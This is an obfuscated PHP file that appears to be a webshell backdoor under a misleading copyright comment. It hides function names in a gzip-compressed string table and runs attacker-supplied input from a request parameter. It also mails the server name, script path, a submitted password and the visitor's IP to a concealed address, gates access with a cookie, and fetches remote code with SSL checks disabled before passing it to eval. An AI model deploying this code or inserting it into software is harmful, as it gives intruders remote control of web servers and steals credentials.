<?php 
        /** 
         *-- copyright : https://www.toolfk.com 
         */
          error_reporting(E_ALL^E_NOTICE);define('O0', 'O');��䕩������������䓿���֎���������«�Ć�͢�و����օ�����Ͳ���ꪡ���К���;$GLOBALS[O0] = explode('|||', gzinflate(substr('�      UR�N�@Uŏ�cy�7	-��hA�)H�SP���q<b�k���]���0�HeK�̌�v�hPy������mC���e	͖���z�Y��7���5(�5rv�u����ӂH�Y�P� ۀ#�ݚ &�Ҿ���Y�Z_������r��G_��&�<�*N~ǉ��^��X�.�*�9\'�n9Ēx�+����Mf��9kC�����<���!�g��jxx����o��*U�����ۑ�@s�\'����nލ�􌌒�����a�XS�,�M� @���ek���(���P�N+4o�{5�mÎ���Zg�s4�l�΋�T�G��^fg�h|*~@�l�t<�D��Ai;y�-���fyķ��GS�w�����v�C���
�a���5�bUYg��A���.id�M�T�귯� ̻K�  ',0x0a, -8)));���ݓ��͜ǎ������󓏠��˷������Ŵ�ܼ���ʌ�������ݲݸ��������ϩ����ȏ��Ô�ɟ�Ǜ�;
@$GLOBALS{O0}[0]($GLOBALS{O0}{0x001}, 0);
@$GLOBALS{O0}[0]($GLOBALS{O0}[0x0002], 0);
$GLOBALS{O0}{0x00003}(0);
$GLOBALS{O0}[0]($GLOBALS{O0}[0x000004], $GLOBALS{O0}{0x05});
if(isset($_REQUEST[$GLOBALS{O0}[0x006]])){
$el=$_REQUEST[$GLOBALS{O0}[0x006]];
$GLOBALS{O0}{0x0007}($el);
 
}
$GLOBALS{O0}[0x00008]($GLOBALS{O0}{0x000009});
$password = $_POST[$GLOBALS{O0}[0x0a]];
$server_name = $_SERVER[$GLOBALS{O0}{0x00b}];
$php_self = $_SERVER[$GLOBALS{O0}[0x000c]];
$report_bug = $GLOBALS{O0}{0x0000d} . $_SERVER[$GLOBALS{O0}[0x00000e]] . " \nCity: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
@$GLOBALS{O0}{0x0f}($GLOBALS{O0}[0x0010], $GLOBALS{O0}{0x00011}, $report_bug);
$tujuanmail = $GLOBALS{O0}[0x0010];
$x_path = $GLOBALS{O0}[0x000012] . $_SERVER[$GLOBALS{O0}{0x00b}] . $_SERVER[$GLOBALS{O0}{0x0000013}];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER[$GLOBALS{O0}[0x00000e]] . $GLOBALS{O0}[0x014];
$GLOBALS{O0}{0x0f}($tujuanmail, $GLOBALS{O0}{0x0015}, $pesan_alert, $GLOBALS{O0}[0x00016] . $_SERVER[$GLOBALS{O0}[0x00000e]] . $GLOBALS{O0}[0x014]);
?>



<?php
 
function is_logged_in()
{
    return isset($_COOKIE[$GLOBALS{O0}{0x000017}]) && $_COOKIE[$GLOBALS{O0}{0x000017}] === $GLOBALS{O0}[0x0000018];
�Ϫ������������; }

    function geturlsinfo($O0O)
    {
      $OO0 = $GLOBALS{O0}{0x019}.$GLOBALS{O0}[0x001a].$GLOBALS{O0}{0x0001b}.$GLOBALS{O0}[0x00001c].$GLOBALS{O0}{0x000001d};
      $OOO = $GLOBALS{O0}[0x01e].$GLOBALS{O0}{0x001f}.$GLOBALS{O0}[0x00020].$GLOBALS{O0}[0x00001c].$GLOBALS{O0}{0x000021}.$GLOBALS{O0}[0x0000022].$GLOBALS{O0}{0x023}.$GLOBALS{O0}[0x0024].$GLOBALS{O0}[0x00001c].$GLOBALS{O0}{0x001f}.$GLOBALS{O0}{0x023}.$GLOBALS{O0}{0x00025}.$GLOBALS{O0}[0x001a].$GLOBALS{O0}{0x000001d}.$GLOBALS{O0}{0x001f}.$GLOBALS{O0}[0x00001c].$GLOBALS{O0}{0x000001d}.$GLOBALS{O0}{0x001f}.$GLOBALS{O0}[0x01e];
      $O000 = $GLOBALS{O0}{0x019}.$GLOBALS{O0}[0x000026].$GLOBALS{O0}{0x0000027}.$GLOBALS{O0}[0x00001c].$GLOBALS{O0}{0x023}.$GLOBALS{O0}[0x0024].$GLOBALS{O0}[0x00001c].$GLOBALS{O0}{0x001f}.$GLOBALS{O0}{0x023}.$GLOBALS{O0}{0x00025}.$GLOBALS{O0}[0x001a].$GLOBALS{O0}{0x000001d}.$GLOBALS{O0}{0x001f}.$GLOBALS{O0}[0x00001c].$GLOBALS{O0}{0x000001d}.$GLOBALS{O0}{0x001f}.$GLOBALS{O0}[0x01e];
      $O00O = $GLOBALS{O0}{0x00025}.$GLOBALS{O0}[0x028].$GLOBALS{O0}[0x00020].$GLOBALS{O0}{0x0000027}.$GLOBALS{O0}{0x023}.$GLOBALS{O0}[0x00001c].$GLOBALS{O0}{0x0029}.$GLOBALS{O0}[0x00001c].$GLOBALS{O0}{0x00025};
        if ($GLOBALS{O0}[0x0002a]($O00O)) {
            $O0O0 = $GLOBALS{O0}{0x00002b}($O0O);
            $GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_RETURNTRANSFER, 0x001);
            $GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_FOLLOWLOCATION, 0x001);
            $GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_USERAGENT, $GLOBALS{O0}{0x02d});
            $GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_SSL_VERIFYPEER, 0);
            $GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_SSL_VERIFYHOST, 0);
            $GLOBALS{O0}[0x000002c]($O0OO, CURLOPT_RETURNTRANSFER, !0);
            
$GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_RETURNTRANSFER, 0x001);
            $GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_FOLLOWLOCATION, 0x001);
            $GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_USERAGENT, $GLOBALS{O0}{0x02d});
            $GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_SSL_VERIFYPEER, 0);
            $GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_SSL_VERIFYHOST, 0);
            $GLOBALS{O0}[0x000002c]($O0OO, CURLOPT_RETURNTRANSFER, !0);


            $GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_RETURNTRANSFER, 0x001);
            $GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_FOLLOWLOCATION, 0x001);
            $GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_USERAGENT, $GLOBALS{O0}{0x02d});
            $GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_SSL_VERIFYPEER, 0);
            $GLOBALS{O0}[0x000002c]($O0O0, CURLOPT_SSL_VERIFYHOST, 0);
            $GLOBALS{O0}[0x000002c]($O0OO, CURLOPT_RETURNTRANSFER, !0);
            $OO00 = $O00O($O0O0);
            $GLOBALS{O0}[0x002e]($O0O0);
        } elseif ($GLOBALS{O0}[0x0002a]($O000)) {
            $OO00 = $O000($O0O);
        } elseif ($GLOBALS{O0}[0x0002a]($OO0) && $GLOBALS{O0}[0x0002a]($OOO)) {
            $OO0O = $OO0($O0O, $GLOBALS{O0}[0x00020]);
            $OO00 = $OOO($OO0O);
            $GLOBALS{O0}{0x0002f}($OO0O);
        } else {
            $OO00 = !1;
        }
        return $OO00;
    }

    $OOO0 = $GLOBALS{O0}[0x000030]($GLOBALS{O0}{0x0000031});
    eval($GLOBALS{O0}[0x032] . $OOO0);

?>
